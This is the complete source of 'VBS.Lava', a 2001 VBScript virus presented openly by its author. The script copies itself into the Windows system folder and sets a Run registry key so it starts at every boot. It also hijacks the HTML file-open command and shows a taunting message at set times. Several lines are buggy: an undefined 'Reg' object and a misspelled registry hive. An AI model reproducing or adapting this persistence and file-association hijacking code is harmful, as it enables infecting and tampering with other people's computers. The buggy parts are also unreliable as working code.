'Exercise RayRider !
'Commandoes the Best ! Lava owns the whole airbase...
'Copyright@2001 Lava

On Error Resume Next
Set lava = CreateObject("Scripting.FileSystemObject")
Set aval = CreateObject("WScript.Shell")
Const SystemFolder = 1, ForReading = 1, ForWriting = 2, ForAppending = 8

Dim lava1, aval, lava2, lava3, lava4, lava5, lava6
lava1 = WScript.ScriptFullName
Set lava2 = lava.GetSpecialFolder(SystemFolder)
lava4 = lava2 & "\VBS.Lava.vbs"
If (lava.FileExists(lava4)) Then
	Set lava5 = Reg.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Lava")
	If Not lava5 = lava4 Then
	aval.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Lava", lava4
	End If

Else

	aval.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Lava\Runs", "1"
	aval.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Lava\Notifies", "0"
	aval.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Lava", lava4
	Set ReadMe = lava.OpenTextFile(lava1, ForReading)
	aval = ReadMe.ReadAll
	ReadMe.Close
	Set lava3 = lava.CreateTextFile(lava4, True)
	lava3.Write aval
	lava3.Close
End If

Mins = Minute(Now)

If Mins = "15" Then
	lava6 = Reg.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Lava\Runs")
	Notifies = Reg.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Lava\Notifies")
	MsgBox "Tick Tick... " & (Chr(13) & Chr(10)) & "It's 3am in the morning, I've planted stickers on your System For " & lava6 & " Restarts Before Making Myself Known To You. I miss my girlfriend.. 
I've notified U" & notifies & "Time(s) Before" & (Chr(13) & Chr(10)) & (Chr(13) & Chr(10)) & "VBS.Lava" & (Chr(13) & Chr(10)) & "Coded by Lava" & (Chr(13) & Chr(10)) & "jEREMY" & (Chr(13) & Chr(10)) & "http://www.commandos.com", 4096, "VBS.Lava"
	aval.RegWrite "HKEY_CLASSES_ROOT\htmlfile\shell\open\command\(Default)", "c:\windows\system\Lava.vbs"
	aval.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Lava\Runs", "0"
	aval.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Lava\Notifies", "Notifies" 
Else
	lava6 = Reg.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Lava\Runs") 
	lava6 = lava6 + 1
	aval.RegWrite "HKEY_LOCAL_MACHICE\Software\Microsoft\Windows\CurrentVersion\Lava\Runs", lava6 
End If